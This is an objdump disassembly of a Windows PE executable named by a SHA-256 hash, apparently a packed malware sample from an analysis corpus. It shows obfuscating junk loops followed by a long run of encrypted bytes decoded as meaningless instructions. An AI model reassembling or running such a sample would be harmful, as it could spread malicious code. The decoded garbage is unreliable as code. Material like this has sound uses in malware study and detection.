
d40622613afe8304c5b87a9633bcfd82efd302807f236495f4f8ffcfbebc29fd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e89,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e89,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9d,0x10
  401025:	cmp    DWORD PTR ds:0x428e9d,0x0
  40102c:	je     0x401092
  401032:	cmp    DWORD PTR ds:0x428e9d,0x3
  401039:	jle    0x401092
  40103f:	jmp    0x401066
  401044:	push   0x559d
  401049:	push   0x2a1f
  40104e:	push   0x41ed
  401053:	push   DWORD PTR [ebp-0x1c]
  401056:	push   0x428124
  40105b:	push   0x44ac
  401060:	call   DWORD PTR ds:0x42ca10
  401066:	cmp    DWORD PTR ds:0x428e9d,0x4
  40106d:	jne    0x401080
  401073:	mov    edi,DWORD PTR ds:0x428e9d
  401079:	dec    edi
  40107a:	mov    DWORD PTR ds:0x428e9d,edi
  401080:	mov    edi,DWORD PTR ds:0x428e9d
  401086:	dec    edi
  401087:	mov    DWORD PTR ds:0x428e9d,edi
  40108d:	jmp    0x401025
  401092:	mov    esi,0x75108b1
  401097:	mov    DWORD PTR ds:0x428e91,0x16
  4010a1:	cmp    DWORD PTR ds:0x428e91,0x0
  4010a8:	je     0x4010ef
  4010ae:	cmp    DWORD PTR ds:0x428e91,0x25
  4010b5:	jge    0x4010ef
  4010bb:	jmp    0x4010dd
  4010c0:	push   DWORD PTR [ebp-0x20]
  4010c3:	push   0x1b69
  4010c8:	push   0x4c28
  4010cd:	push   0x78bb
  4010d2:	push   0x428ec1
  4010d7:	call   DWORD PTR ds:0x42ca14
  4010dd:	mov    ecx,DWORD PTR ds:0x428e91
  4010e3:	dec    ecx
  4010e4:	mov    DWORD PTR ds:0x428e91,ecx
  4010ea:	jmp    0x4010a1
  4010ef:	xor    eax,esi
  4010f1:	or     ecx,DWORD PTR ds:0x428e95
  4010f7:	mov    edi,0x3272f8
  4010fc:	add    eax,edi
  4010fe:	xor    ecx,DWORD PTR ds:0x428e61
  401104:	mov    DWORD PTR [ebp-0x40],eax
  401107:	mov    ecx,DWORD PTR ds:0x428ef5
  40110d:	mov    eax,ds:0x42a075
  401112:	sub    eax,ecx
  401114:	sub    ecx,DWORD PTR [ecx+eax*1]
  401117:	mov    eax,ds:0x4281e5
  40111c:	or     ecx,0x6919
  401122:	mov    eax,DWORD PTR [eax]
  401124:	mov    DWORD PTR [ebp-0x3c],eax
  401127:	mov    eax,ds:0x4283f5
  40112c:	xor    ecx,0x14c1
  401132:	mov    eax,DWORD PTR [eax]
  401134:	mov    DWORD PTR [ebp-0x1c],eax
  401137:	and    DWORD PTR ds:0x428e75,0x31f0
  401141:	mov    DWORD PTR [ebp-0x34],0xf89c87b9
  401148:	or     ecx,ecx
  40114a:	mov    eax,DWORD PTR [ebp-0x34]
  40114d:	xor    eax,esi
  40114f:	add    eax,edi
  401151:	mov    DWORD PTR [ebp-0x40],eax
  401154:	and    DWORD PTR ds:0x428eb9,0x0
  40115e:	jmp    0x401170
  401163:	mov    ecx,DWORD PTR ds:0x428eb9
  401169:	inc    ecx
  40116a:	mov    DWORD PTR ds:0x428eb9,ecx
  401170:	cmp    DWORD PTR ds:0x428eb9,0x1c
  401177:	jae    0x4011a0
  40117d:	cmp    DWORD PTR ds:0x428eb9,0x21
  401184:	jl     0x4011a0
  40118a:	jmp    0x40119b
  40118f:	push   DWORD PTR [ebp-0xc]
  401192:	push   DWORD PTR [ebp-0x18]
  401195:	call   DWORD PTR ds:0x42ca18
  40119b:	jmp    0x401163
  4011a0:	mov    eax,ds:0x428365
  4011a5:	or     DWORD PTR ds:0x428eb1,0x3218
  4011af:	mov    DWORD PTR [ebp-0x40],eax
  4011b2:	mov    DWORD PTR ds:0x428e69,0x16
  4011bc:	cmp    DWORD PTR ds:0x428e69,0x0
  4011c3:	je     0x401218
  4011c9:	cmp    DWORD PTR ds:0x428e69,0xb
  4011d0:	jg     0x401218
  4011d6:	jmp    0x4011ec
  4011db:	push   0x42804e
  4011e0:	push   DWORD PTR [ebp-0x24]
  4011e3:	push   DWORD PTR [ebp-0x24]
  4011e6:	call   DWORD PTR ds:0x42ca4c
  4011ec:	cmp    DWORD PTR ds:0x428e69,0xc
  4011f3:	jne    0x401206
  4011f9:	mov    ecx,DWORD PTR ds:0x428e69
  4011ff:	dec    ecx
  401200:	mov    DWORD PTR ds:0x428e69,ecx
  401206:	mov    ecx,DWORD PTR ds:0x428e69
  40120c:	dec    ecx
  40120d:	mov    DWORD PTR ds:0x428e69,ecx
  401213:	jmp    0x4011bc
  401218:	mov    eax,DWORD PTR [ebp-0x3c]
  40121b:	sbb    DWORD PTR ds:0x428ea5,0x6db4
  401225:	mov    DWORD PTR [ebp-0x14],eax
  401228:	mov    eax,DWORD PTR [ebp-0x14]
  40122b:	movzx  ecx,BYTE PTR ds:0x428e45
  401232:	xor    ecx,DWORD PTR ds:0x428e79
  401238:	mov    DWORD PTR ds:0x428e45,ecx
  40123e:	jmp    0x403595
  401243:	lods   eax,DWORD PTR ds:[esi]
  401244:	ins    DWORD PTR es:[edi],dx
  401245:	call   0x9776:0xb1685a84
  40124c:	xchg   ebx,eax
  40124d:	add    bh,cl
  40124f:	cmc    
  401250:	xchg   bl,al
  401252:	sti    
  401253:	jnp    0x4012d0
  401255:	jnp    0x4012d2
  401257:	mov    ch,0x9e
  401259:	jnp    0x4012d6
  40125b:	aam    0xcd
  40125d:	(bad)  
  40125e:	rcr    al,0xc4
  401261:	fcmove st,st(6)
  401263:	test   bl,al
  401265:	mov    BYTE PTR [edi-0x7473722d],al
  40126b:	mov    WORD PTR [ebx-0x6effe2dc],?
  401271:	test   eax,0x519a808a
  401276:	or     DWORD PTR [eax+ebx*4-0x3e5463d2],0x7766fb6d
  401281:	xchg   esi,eax
  401282:	lods   al,BYTE PTR ds:[esi]
  401283:	jle    0x40123b
  401285:	jno    0x4012ce
  401287:	jle    0x4012ca
  401289:	inc    ebx
  40128a:	mov    edx,0x1d87fecd
  40128f:	sti    
  401290:	xchg   edx,eax
  401291:	jle    0x401272
  401293:	or     al,0xb8
  401295:	sub    al,0x3b
  401297:	or     al,0x66
  401299:	rcr    BYTE PTR [edi],cl
  40129b:	push   0xffffffc8
  40129d:	out    dx,al
  40129e:	cwde   
  40129f:	dec    edx
  4012a0:	imul   esp,DWORD PTR ds:0xe51c8cf6,0x15
  4012a7:	out    dx,eax
  4012a8:	sti    
  4012a9:	(bad)  
  4012aa:	fldcw  WORD PTR [ecx-0x76753813]
  4012b0:	cmp    BYTE PTR [esi-0x2e],cl
  4012b3:	mov    al,ds:0x8fe47e4
  4012b8:	test   al,0xca
  4012ba:	jne    0x40126f
  4012bc:	sub    DWORD PTR [edx+0x79fbdbf8],ebx
  4012c2:	inc    eax
  4012c3:	sbb    BYTE PTR [ecx+ebx*2],0x9e
  4012c7:	push   0x40
  4012c9:	out    0xd5,al
  4012cb:	arpl   WORD PTR [eax+0x73bd5ff2],si
  4012d1:	jb     0x4012bd
  4012d3:	sbb    ecx,esp
  4012d5:	xchg   ebx,eax
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	mov    ch,0xb2
  4012d9:	xchg   ebp,eax
  4012da:	add    ch,BYTE PTR [esi]
  4012dc:	imul   ecx,eax,0x68
  4012df:	xor    DWORD PTR [esi],esi
  4012e1:	sub    eax,0xa4059069
  4012e6:	xchg   ebx,eax
  4012e7:	lods   eax,DWORD PTR ds:[esi]
  4012e8:	in     eax,dx
  4012e9:	mov    edi,0x4ce2b7f2
  4012ee:	stos   BYTE PTR es:[edi],al
  4012ef:	sub    eax,DWORD PTR [esi-0x4f]
  4012f2:	and    ebp,esp
  4012f4:	xchg   edi,eax
  4012f5:	cld    
  4012f6:	xchg   ebx,eax
  4012f7:	xchg   edi,eax
  4012f8:	inc    esp
  4012f9:	clc    
  4012fa:	mov    DWORD PTR [esi],edi
  4012fc:	stc    
  4012fd:	mov    ds:0xd28476dd,eax
  401302:	bound  ebx,QWORD PTR [ecx+0x6c]
  401305:	xchg   esi,eax
  401306:	fstp   QWORD PTR [edx-0x5a]
  401309:	push   0xffffffd9
  40130b:	es pusha 
  40130d:	mov    eax,0xf716fc14
  401312:	mov    esi,0xae97e996
  401317:	and    BYTE PTR [esp+ebx*2+0x629ccf92],dl
  40131e:	push   ebx
  40131f:	xor    DWORD PTR [esi],eax
  401321:	adc    al,0xd6
  401323:	popf   
  401324:	mov    gs,WORD PTR [ebx+eiz*2]
  401327:	adc    esp,DWORD PTR [edx-0x3]
  40132a:	retf   0x3d56
  40132d:	or     eax,0x364bc917
  401332:	pop    eax
  401333:	inc    ecx
  401334:	repz pop eax
  401336:	or     ebp,DWORD PTR [ebp+0x36cce183]
  40133c:	retf   
  40133d:	ins    DWORD PTR es:[edi],dx
  40133e:	push   DWORD PTR [edi]
  401340:	mov    WORD PTR [ebx],?
  401342:	lea    ebx,[esi]
  401344:	test   eax,0xa820a145
  401349:	aas    
  40134a:	ror    ebp,cl
  40134c:	push   ebx
  40134d:	dec    eax
  40134e:	jecxz  0x40132b
  401350:	rcl    ah,1
  401352:	fistp  WORD PTR [edx+eax*2+0x3c]
  401356:	add    BYTE PTR [edi],al
  401358:	adc    ah,BYTE PTR [ebx-0x6301c218]
  40135e:	mov    ebp,DWORD PTR [esi]
  401360:	pop    ebp
  401361:	push   0xffffffd9
  401363:	and    dh,BYTE PTR [edx-0x7ea24f08]
  401369:	add    BYTE PTR [eax-0x2c2aa805],ah
  40136f:	loope  0x40133d
  401371:	mov    al,BYTE PTR [esi+0x69]
  401374:	dec    ecx
  401375:	sbb    bh,BYTE PTR [ebx+0x51]
  401378:	inc    ebx
  401379:	jp     0x401352
  40137b:	dec    edi
  40137c:	out    0x45,al
  40137e:	add    bl,BYTE PTR [esi+ebp*2+0x74]
  401382:	pop    edi
  401383:	xchg   BYTE PTR [eax+0x7],cl
  401386:	inc    edx
  401387:	ins    BYTE PTR es:[edi],dx
  401388:	jl     0x401327
  40138a:	out    dx,eax
  40138b:	retf   
  40138c:	cmp    ecx,DWORD PTR [edi-0xc2c99ca]
  401392:	scas   al,BYTE PTR es:[edi]
  401393:	xor    eax,0x6b10175f
  401398:	cmp    al,0x53
  40139a:	outs   dx,BYTE PTR ds:[esi]
  40139b:	adc    eax,0x2f684915
  4013a0:	gs mov ebx,0xaf3a409b
  4013a6:	(bad)  
  4013a7:	sub    BYTE PTR [edx-0x5d],cl
  4013aa:	aam    0x93
  4013ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013ad:	sbb    ah,cl
  4013af:	das    
  4013b0:	(bad)  
  4013b1:	fistp  DWORD PTR [edi-0x75]
  4013b4:	stos   BYTE PTR es:[edi],al
  4013b5:	adc    esp,DWORD PTR [edi+0x4df5ee2b]
  4013bb:	inc    esp
  4013bc:	jl     0x401363
  4013be:	cld    
  4013bf:	std    
  4013c0:	push   esp
  4013c1:	mov    dl,0xff
  4013c3:	call   0x7002dc85
  4013c8:	or     eax,0x538e3c97
  4013cd:	fs pop ebx
  4013cf:	(bad)  
  4013d0:	fbstp  TBYTE PTR [esi-0x6cd1f16b]
  4013d6:	cmp    ah,cl
  4013d8:	(bad)  
  4013d9:	das    
  4013da:	dec    edx
  4013db:	jo     0x4013f8
  4013dd:	inc    esi
  4013de:	mov    ecx,ebp
  4013e0:	sbb    esi,DWORD PTR [edx]
  4013e2:	or     al,0x3e
  4013e4:	iret   
  4013e5:	scas   eax,DWORD PTR es:[edi]
  4013e6:	jecxz  0x401374
  4013e8:	jb     0x401385
  4013ea:	les    edx,FWORD PTR [ebx+0x6083fbe]
  4013f0:	popa   
  4013f1:	mov    bl,0x61
  4013f3:	mov    al,ds:0x2c85960e
  4013f8:	sub    bh,bh
  4013fa:	daa    
  4013fb:	mov    ds:0xa154b083,al
  401400:	jge    0x40147d
  401402:	xor    dl,BYTE PTR [edx]
  401404:	cld    
  401405:	retf   0x970b
  401408:	lods   eax,DWORD PTR ds:[esi]
  401409:	ja     0x40143d
  40140b:	loopne 0x40144d
  40140d:	adc    DWORD PTR [esi],esi
  40140f:	and    DWORD PTR [ebx+0x44f96203],edx
  401415:	mov    cl,0x17
  401417:	mov    ebp,0xc77fabba
  40141c:	or     DWORD PTR [esp+eiz*4],eax
  40141f:	clc    
  401420:	mov    dl,0xec
  401422:	mov    esp,0x33ddf04
  401427:	fistp  DWORD PTR [ecx+0x271b5295]
  40142d:	popa   
  40142e:	adc    esp,esi
  401430:	jp     0x401470
  401432:	into   
  401433:	jns    0x401435
  401435:	mov    ebp,0x9a220454
  40143a:	(bad)  
  40143b:	(bad)  
  40143c:	imul   eax,DWORD PTR [ebx-0x4],0x3686a503
  401443:	stos   BYTE PTR es:[edi],al
  401444:	add    ah,0xc7
  401447:	mov    WORD PTR [edi-0x23],ss
  40144a:	cli    
  40144b:	mov    ebx,0xc91a53b4
  401450:	pop    ebx
  401451:	fst    DWORD PTR [ecx+ecx*4-0x33dc6ac6]
  401458:	sete   BYTE PTR [edx]
  40145b:	in     al,0xcb
  40145d:	js     0x4013f4
  40145f:	jg     0x4014a5
  401461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401462:	sbb    eax,0xe73eb83f
  401467:	jne    0x4014d5
  401469:	fxch   st(6)
  40146b:	cs inc ecx
  40146d:	sub    dl,BYTE PTR [ecx]
  40146f:	std    
  401470:	adc    ebp,DWORD PTR [edi-0x39b7a23d]
  401476:	sbb    eax,0xee0425f3
  40147b:	or     ebp,DWORD PTR ds:0xb5c8e9f6
  401481:	xor    cl,0x3
  401484:	dec    ebx
  401485:	dec    esi
  401486:	mov    edx,0x408a6f63
  40148b:	ja     0x4014ba
  40148d:	nop
  40148e:	and    dh,BYTE PTR [ecx]
  401490:	test   eax,0x75f930ce
  401495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401496:	or     dh,cl
  401498:	adc    BYTE PTR [ebp+0x1e],ch
  40149b:	frstor [eax+ecx*4]
  40149e:	sbb    edi,ebp
  4014a0:	add    eax,0x253a6993
  4014a5:	push   0x64465532
  4014aa:	jnp    0x40143d
  4014ac:	and    dh,BYTE PTR [eax+0x17]
  4014af:	fmul   QWORD PTR [ebx+0x53903f1b]
  4014b5:	aas    
  4014b6:	loopne 0x40152a
  4014b8:	and    al,0x69
  4014ba:	scas   eax,DWORD PTR es:[edi]
  4014bb:	cwde   
  4014bc:	test   DWORD PTR ds:0xa4f949dc,ecx
  4014c2:	jge    0x401460
  4014c4:	shl    edx,cl
  4014c6:	shl    BYTE PTR [edi+0x17ddd634],cl
  4014cc:	jle    0x40147b
  4014ce:	jle    0x4014f2
  4014d0:	xchg   ecx,eax
  4014d1:	inc    esp
  4014d2:	(bad)  
  4014d3:	mov    edx,0x81f01ba3
  4014d8:	or     BYTE PTR [ebx-0x7ac58e],al
  4014de:	add    BYTE PTR [eax*4+0x56649e87],cl
  4014e5:	in     al,dx
  4014e6:	in     al,dx
  4014e7:	das    
  4014e8:	fdiv   st,st(4)
  4014ea:	sbb    eax,ebx
  4014ec:	bound  esp,QWORD PTR [edx-0x1f41c4ca]
  4014f2:	and    edx,DWORD PTR [ebp+0x596e13e7]
  4014f8:	push   ebp
  4014f9:	popf   
  4014fa:	or     al,BYTE PTR [ecx]
  4014fc:	lahf   
  4014fd:	lea    esp,[ecx+0x7d591de5]
  401503:	stos   DWORD PTR es:[edi],eax
  401504:	xchg   ebx,eax
  401505:	out    dx,al
  401506:	sbb    esp,ecx
  401508:	jns    0x40156f
  40150a:	add    al,0x62
  40150c:	retf   0x5f12
  40150f:	pop    ebx
  401510:	fs mov dh,0xf
  401513:	cli    
  401514:	sti    
  401515:	out    0xc0,eax
  401517:	xor    eax,DWORD PTR [ecx]
  401519:	(bad)  
  40151a:	pop    ebx
  40151b:	ficomp WORD PTR [eax+0x3c]
  40151e:	mov    cl,0xdf
  401520:	or     BYTE PTR [eax],cl
  401522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401523:	add    DWORD PTR [edx],ebx
  401525:	nop
  401526:	sub    eax,0x2069f25a
  40152b:	push   es
  40152c:	add    DWORD PTR [eax],0x28
  40152f:	hlt    
  401530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401531:	stos   DWORD PTR es:[edi],eax
  401532:	test   DWORD PTR [edx-0x3b0dcb11],ebp
  401538:	cmp    esp,DWORD PTR [edi+eiz*1-0x2d]
  40153c:	hlt    
  40153d:	or     BYTE PTR [ebx-0x5c3ec6d6],ch
  401543:	mov    esp,DWORD PTR [edx+0x53]
  401546:	push   esi
  401547:	out    0x74,eax
  401549:	jno    0x4015c6
  40154b:	jo     0x401561
  40154d:	scas   eax,DWORD PTR es:[edi]
  40154e:	fdivr  DWORD PTR [edx]
  401550:	mov    dl,0xa4
  401552:	inc    ecx
  401553:	push   esp
  401554:	test   eax,0x2e52745b
  401559:	mov    ds:0x77cd103c,al
  40155e:	(bad)  
  40155f:	aas    
  401560:	aaa    
  401561:	sar    DWORD PTR [ecx],0xea
  401564:	inc    edx
  401565:	int    0x48
  401567:	jl     0x401575
  401569:	std    
  40156a:	mov    ch,0xcd
  40156c:	push   edi
  40156d:	sti    
  40156e:	jmp    0x401524
  401570:	(bad)  
  401572:	push   edx
  401573:	xchg   esi,eax
  401574:	bnd jmp 0x4015e2
  401577:	fdivr  st(7),st
  401579:	setno  BYTE PTR [ebx-0x11]
  40157d:	mov    eax,ds:0x63b37066
  401582:	jmp    0xa5ad0625
  401587:	sub    esp,DWORD PTR [ebx+eiz*8]
  40158a:	and    BYTE PTR [esi+ecx*1-0x15a84fdd],dh
  401591:	inc    esp
  401592:	pop    eax
  401593:	gs adc cl,bh
  401596:	cli    
  401597:	loopne 0x4015ad
  401599:	inc    ebx
  40159a:	inc    edx
  40159b:	ficomp DWORD PTR [eax-0x16]
  40159e:	(bad)  
  40159f:	xchg   ecx,eax
  4015a0:	pop    edx
  4015a1:	into   
  4015a2:	scas   eax,DWORD PTR es:[edi]
  4015a3:	stos   DWORD PTR es:[edi],eax
  4015a4:	or     BYTE PTR [ebp-0x3b],bl
  4015a7:	or     cl,dl
  4015a9:	repnz gs lock retf 0xd1ca
  4015af:	sbb    eax,0x9acd1d3b
  4015b4:	stc    
  4015b5:	ins    BYTE PTR es:[edi],dx
  4015b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b7:	push   ss
  4015b8:	dec    eax
  4015b9:	es daa 
  4015bb:	(bad)  [eax-0x77]
  4015be:	daa    
  4015bf:	mov    DWORD PTR [esi+0x38572bc8],0x79f61463
  4015c9:	xlat   BYTE PTR ds:[ebx]
  4015ca:	js     0x40156a
  4015cc:	xor    DWORD PTR ds:0x883bf13c,ebx
  4015d2:	cmp    eax,0xeebe0275
  4015d7:	mov    ebp,0xff22cd46
  4015dc:	cmp    al,0xbe
  4015de:	test   edi,0x95e703ee
  4015e4:	icebp  
  4015e5:	sub    eax,0xb16650a9
  4015ea:	dec    ecx
  4015eb:	cli    
  4015ec:	pop    ebx
  4015ed:	push   ebp
  4015ee:	xor    edx,DWORD PTR [esi-0x59e1258f]
  4015f4:	jecxz  0x401601
  4015f6:	mov    ch,0xec
  4015f8:	mov    ds:0x56dff0e,eax
  4015fd:	mov    edx,0x88c760b
  401602:	push   es
  401603:	ret    
  401604:	xor    BYTE PTR [eax+0x285457b6],dl
  40160a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40160b:	bound  edi,QWORD PTR [ebx-0x1d]
  40160e:	add    al,ch
  401610:	jge    0x4015c2
  401612:	jge    0x401620
  401614:	and    esp,DWORD PTR [eax-0x1adc849d]
  40161a:	push   edx
  40161b:	jb     0x401613
  40161d:	pop    eax
  40161e:	jecxz  0x4015bd
  401620:	std    
  401621:	jae    0x401689
  401623:	sub    al,0xd4
  401625:	pop    es
  401626:	ds dec eax
  401628:	mov    ?,WORD PTR [ebx]
  40162a:	dec    edi
  40162b:	std    
  40162c:	jns    0x401658
  40162e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40162f:	push   eax
  401630:	add    DWORD PTR [ebx+esi*4+0x7f],0xffffffe2
  401635:	fucomp st(3)
  401637:	pop    edx
  401638:	sbb    edi,DWORD PTR [esi+0x61]
  40163b:	ins    DWORD PTR es:[edi],dx
  40163c:	adc    dl,BYTE PTR ds:0x375813cf
  401642:	pop    ss
  401643:	mov    ds:0x9613e224,eax
  401648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401649:	jge    0x4015da
  40164b:	xor    al,0xbb
  40164d:	ins    BYTE PTR es:[edi],dx
  40164e:	out    0x34,al
  401650:	push   ebp
  401651:	out    0xe0,eax
  401653:	jg     0x40166f
  401655:	adc    al,0xe2
  401657:	test   al,0x3a
  401659:	pop    eax
  40165a:	daa    
  40165b:	inc    ebx
  40165c:	imul   edx,DWORD PTR ss:[ebp-0x73],0xcb4adf4e
  401664:	das    
  401665:	pop    ebx
  401666:	in     eax,0xce
  401668:	js     0x401614
  40166a:	lds    ebp,FWORD PTR [edx+0xe]
  40166d:	mov    esp,DWORD PTR ds:[ebx-0x6bb0a25e]
  401674:	add    BYTE PTR [ebx+0x1c],cl
  401677:	jmp    0x401635
  401679:	jae    0x401657
  40167b:	fcom   st(3)
  40167d:	outs   dx,DWORD PTR ds:[esi]
  40167e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40167f:	cmp    eax,0x217fba18
  401684:	cwde   
  401685:	xor    DWORD PTR [edi-0x66],ecx
  401688:	test   eax,0x4a806575
  40168d:	mov    bl,0xd5
  40168f:	inc    edx
  401690:	cdq    
  401691:	push   ss
  401692:	mov    ecx,0x272f184
  401697:	sbb    eax,0x90718f5a
  40169c:	and    BYTE PTR [ebp-0x5],dh
  40169f:	add    BYTE PTR cs:[eax],dl
  4016a2:	xor    eax,0x13aa7fea
  4016a7:	fs call 0x4c49:0xc4992b4f
  4016af:	cmc    
  4016b0:	shl    BYTE PTR [ecx-0x15],cl
  4016b3:	imul   ebx,ebx,0xee296ba6
  4016b9:	jmp    0x401702
  4016bb:	mov    edx,0x607573cc
  4016c0:	xor    si,WORD PTR [edi+ebx*4+0x742b41a6]
  4016c8:	and    ebp,DWORD PTR [esi-0x5a078ee8]
  4016ce:	push   es
  4016cf:	scas   al,BYTE PTR es:[edi]
  4016d0:	icebp  
  4016d1:	pop    edi
  4016d2:	xor    DWORD PTR [esi],0x6f
  4016d5:	adc    bh,cl
  4016d7:	lock mov BYTE PTR [ecx+edi*1-0x6179a17f],0xd2
  4016e0:	pop    eax
  4016e1:	ret    
  4016e2:	lds    eax,FWORD PTR [ebx-0x6f]
  4016e5:	add    esp,0x3c
  4016e8:	lock test al,0xc0
  4016eb:	inc    ebx
  4016ec:	test   BYTE PTR [edx+ebp*2-0x66],0xa9
  4016f1:	pop    ebp
  4016f2:	sub    BYTE PTR [edx+0x240540fb],dl
  4016f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f9:	call   0x2c657b8e
  4016fe:	dec    eax
  4016ff:	(bad)  
  401700:	mov    esp,0xdd445ab9
  401705:	inc    edx
  401706:	xor    BYTE PTR [eax+eiz*2-0x17],bl
  40170a:	cwde   
  40170b:	icebp  
  40170c:	fbstp  TBYTE PTR [ecx+edx*1-0x58]
  401710:	mov    edi,0xd350cbaf
  401715:	(bad)  
  401716:	and    ebx,ebp
  401718:	into   
  401719:	pushf  
  40171a:	add    al,0xdd
  40171c:	arpl   WORD PTR ss:[ecx+0x15],bx
  401720:	sub    eax,ebp
  401722:	or     eax,0xc236dc71
  401727:	lods   eax,DWORD PTR ds:[esi]
  401728:	rol    DWORD PTR [edx],cl
  40172a:	ja     0x40176f
  40172c:	daa    
  40172d:	jae    0x40176e
  40172f:	cdq    
  401730:	or     DWORD PTR [eax+0x1a],0x7d
  401734:	(bad)  
  401735:	push   es
  401736:	jne    0x4017ac
  401738:	int3   
  401739:	lds    edx,FWORD PTR [esi]
  40173b:	xlat   BYTE PTR ds:[ebx]
  40173c:	ins    BYTE PTR es:[edi],dx
  40173d:	(bad)  [edi]
  40173f:	push   es
  401740:	(bad)  
  401741:	and    ch,BYTE PTR [eax+0x67bd57da]
  401747:	mov    BYTE PTR [ecx+0x5d],bh
  40174a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40174b:	jo     0x4017ca
  40174d:	xor    BYTE PTR [edi-0x21f53ffe],bh
  401753:	fbstp  TBYTE PTR [edx+ecx*2-0x59b98e92]
  40175a:	mov    eax,ds:0x3d79c8b9
  40175f:	mov    WORD PTR [edi+0x20993abb],fs
  401765:	lods   al,BYTE PTR gs:[esi]
  401767:	fcmovnu st,st(4)
  401769:	and    dl,bl
  40176b:	sbb    eax,0x5db220a7
  401770:	stc    
  401771:	or     BYTE PTR ds:0x93e55b19,bh
  401777:	loopne 0x401778
  401779:	add    ah,BYTE PTR [edi-0xd151109]
  40177f:	ins    BYTE PTR es:[edi],dx
  401780:	jo     0x401717
  401782:	pop    esi
  401783:	pop    edx
  401784:	(bad)  
  401785:	push   ebp
  401786:	adc    eax,0x146a6722
  40178b:	and    esp,ebp
  40178d:	sbb    BYTE PTR [eax+0x9582c47],al
  401793:	lock sbb DWORD PTR [eax+0x1837cf2f],esp
  40179a:	pop    ecx
  40179b:	les    ebx,FWORD PTR [edi-0x13]
  40179e:	mov    BYTE PTR [ecx-0x15],dh
  4017a1:	xor    al,0x95
  4017a3:	mov    DWORD PTR [eax],ebx
  4017a5:	xor    al,BYTE PTR [esi-0xd579f51]
  4017ab:	jecxz  0x401745
  4017ad:	(bad)  
  4017ae:	or     bl,bh
  4017b0:	or     al,0xf4
  4017b2:	push   ss
  4017b3:	cdq    
  4017b4:	push   esp
  4017b5:	pop    ds
  4017b6:	jl     0x401794
  4017b8:	arpl   WORD PTR [edx],sp
  4017ba:	(bad)  
  4017bb:	cmp    al,0x5
  4017bd:	jnp    0x401759
  4017bf:	xchg   edx,eax
  4017c0:	sub    dl,bl
  4017c2:	or     eax,DWORD PTR [edi]
  4017c4:	(bad)  
  4017c5:	adc    DWORD PTR [edi-0x3eefc81d],eax
  4017cb:	fnstcw WORD PTR [edi+0x19]
  4017ce:	pop    ds
  4017cf:	jns    0x40183b
  4017d1:	shl    ah,0x71
  4017d4:	mov    bh,0x7d
  4017d6:	mov    ah,0xbb
  4017d8:	ret    0x1ad5
  4017db:	je     0x40178f
  4017dd:	push   0xffffffc8
  4017df:	pop    ecx
  4017e0:	pusha  
  4017e1:	aam    0xb0
  4017e3:	pop    esi
  4017e4:	push   es
  4017e5:	dec    ecx
  4017e6:	sti    
  4017e7:	in     eax,0x6
  4017e9:	aaa    
  4017ea:	pop    ds
  4017eb:	pop    edi
  4017ec:	(bad)
  4017ef:	ficom  DWORD PTR [ecx+0x6ea88d73]
  4017f5:	push   es
  4017f6:	xlat   BYTE PTR ds:[ebx]
  4017f7:	xchg   DWORD PTR [ebp+ecx*8+0x4bc103ab],ebp
  4017fe:	lahf   
  4017ff:	mov    DWORD PTR [edx+0x3e079518],ebp
  401805:	nop
  401806:	es gs dec ecx
  401809:	xlat   BYTE PTR ds:[ebx]
  40180a:	je     0x40184d
  40180c:	mov    ecx,0x3ca92ed4
  401811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401812:	pushf  
  401813:	gs test esp,ecx
  401816:	adc    cl,BYTE PTR [edi-0xa]
  401819:	mov    ebp,DWORD PTR [edx+0x2c9d4007]
  40181f:	neg    edx
  401821:	xlat   BYTE PTR ds:[ebx]
  401822:	mov    BYTE PTR [esi+0x2d0a5b09],dl
  401828:	mov    dh,0x9c
  40182a:	adc    BYTE PTR [esi+edx*8+0x681cbbbb],0xda
  401832:	sbb    al,0x79
  401834:	div    BYTE PTR [esi+0x36288470]
  40183a:	xchg   ecx,eax
  40183b:	pop    ecx
  40183c:	mov    ds:0xc9db3231,eax
  401841:	ret    0x99a
  401844:	xor    ebx,ebp
  401846:	jmp    0xc13e2242
  40184b:	std    
  40184c:	push   cs
  40184d:	pop    edi
  40184e:	push   eax
  40184f:	inc    ebp
  401850:	setle  BYTE PTR [eax-0x37]
  401854:	cmp    cl,BYTE PTR [ecx+ebp*2+0x68]
  401858:	fs pop ebx
  40185a:	mov    WORD PTR [edi-0x4e],cs
  40185d:	xlat   BYTE PTR ds:[ebx]
  40185e:	sbb    al,0xb3
  401860:	push   es
  401861:	add    DWORD PTR [eax+0x52],edx
  401864:	mov    ah,cl
  401866:	test   bl,dl
  401868:	sub    al,0xe1
  40186a:	pushf  
  40186b:	or     BYTE PTR [ebx],al
  40186d:	lea    ecx,[ecx]
  40186f:	ror    ebp,cl
  401871:	push   esp
  401872:	imul   ebx,DWORD PTR [edi-0x71],0x7ad8106d
  401879:	push   edi
  40187a:	cli    
  40187b:	xlat   BYTE PTR ds:[ebx]
  40187c:	out    0x4,al
  40187e:	out    0x43,eax
  401880:	scas   eax,DWORD PTR es:[edi]
  401881:	out    0x63,eax
  401883:	das    
  401884:	adc    al,BYTE PTR [eax+edx*2]
  401887:	jb     0x40184d
  401889:	cmp    BYTE PTR [ebp+0x4a],al
  40188c:	and    bh,ch
  40188e:	(bad)  
  401890:	pop    ebx
  401891:	inc    esi
  401892:	cmp    al,0x87
  401894:	cmp    ch,BYTE PTR [eax-0x45]
  401897:	fld    st(2)
  401899:	add    eax,0x1863f8be
